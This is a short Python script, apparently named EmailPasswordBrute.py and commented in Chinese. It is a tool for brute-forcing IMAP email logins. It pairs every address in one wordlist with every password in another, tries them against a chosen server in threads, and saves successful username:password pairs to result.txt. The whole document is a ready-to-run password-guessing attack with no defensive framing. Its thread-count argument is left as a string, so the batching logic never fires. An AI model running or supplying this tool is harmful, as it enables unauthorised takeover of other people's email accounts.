import threading
import imaplib
import sys

# 定义登录函数
def login(server, username, password):
    try:
        # 连接到邮箱服务器
        mailbox = imaplib.IMAP4_SSL(server)
        # 使用用户名和密码登录
        try:
            res = mailbox.login(username, password)
            if res[1][0] == b"LOGIN completed":
                print("Login successful!----"+username+":"+password)
                with open("result.txt","a") as res:
                    res.write(username+":"+password+"\n")
                mailbox.select()
                mailbox.close()
                mailbox.logout()
        except Exception as e:
            print(e)
            if e.args[0] == b"ERR.LOGIN.PASSERR":
                print("Pass Error!")
    except Exception as e:
        print(e)

def GetEmails(path):
    with open(path,"r",encoding="utf-8") as email:
        emails = email.readlines()
        return emails

def GetPasswords(path):
    with open(path, "r", encoding="utf-8") as password:
        passwords = password.readlines()
        return passwords


def main(email_path,pass_path,server,th_num):
    emails = GetEmails(email_path)
    passwords = GetPasswords(pass_path)
    #创建线程
    threads = []
    for e in emails:
        for p in passwords:
            thread = threading.Thread(target=login, args=(server, e.strip("\n"), p.strip("\n")))
            threads.append(thread)
            if len(threads) == th_num:
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
                threads = []
    for t in threads:
        t.start()
        t.join()

if __name__=="__main__":
    if len(sys.argv)< 5:
        print("eg:python EmailPasswordBrute.py emails.txt password.txt server threads")
    else:
        email_path = sys.argv[1]
        pass_path = sys.argv[2]
        server = sys.argv[3]
        th_num = sys.argv[4]
        main(email_path,pass_path,server,th_num)

